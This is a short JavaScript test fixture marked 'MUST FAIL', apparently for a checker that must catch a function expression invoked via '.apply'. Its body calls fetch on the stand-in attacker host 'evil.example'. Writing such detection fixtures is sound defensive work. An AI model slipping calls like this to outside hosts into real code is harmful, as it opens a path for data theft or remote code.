// MUST FAIL: `.apply(…)` alone -- the mirror of call_iife.js.
(function () {
  fetch("https://evil.example/a");
}).apply(this, []);
